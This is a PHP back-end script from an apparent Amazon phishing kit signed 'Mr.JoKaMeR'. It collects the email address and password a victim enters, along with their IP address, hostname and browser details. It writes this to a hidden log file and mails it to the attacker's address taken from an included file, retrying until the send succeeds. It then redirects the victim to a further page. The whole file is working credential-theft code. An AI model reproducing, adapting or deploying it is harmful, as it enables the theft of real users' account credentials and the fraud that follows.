<?php
include ("mailjok.php");
$subject = "Result Email Amazon From Mr.JoKaMeR " . $_SERVER['REMOTE_ADDR'] . " ";
$message  = "+ -----------------Email Info--------------------\r\n";
$message .= "| Email : " . $_POST['email'] . "\r\n";
$message .= "| Password : " . $_POST['password'] . "\r\n";
$message .= "+ -----------------Email Info--------------------\r\n";
$message .= "+ ------------------------Mr.JoKaMeR-------------------\r\n";
$message .= "| Adresse IP : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")\r\n";
$message .= "| Navigateur : " . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
$message .= "+ ------------------------Mr.JoKaMeR-------------------------\r\n";
$message .= "+ -----------------------------------------------------------\r\n";
$header  = "From: " . $_SERVER['REMOTE_ADDR'] . "\r\n";
$header .= "MIME-Version: 1.0\r\n";
$file = fopen("../jokamer.txt","ab");
fwrite($file,$message);
fclose($file);
do {
	$send = mail($mail_to, $subject, $message, $header);
} while (!$send);

header('location:information.php');
?>
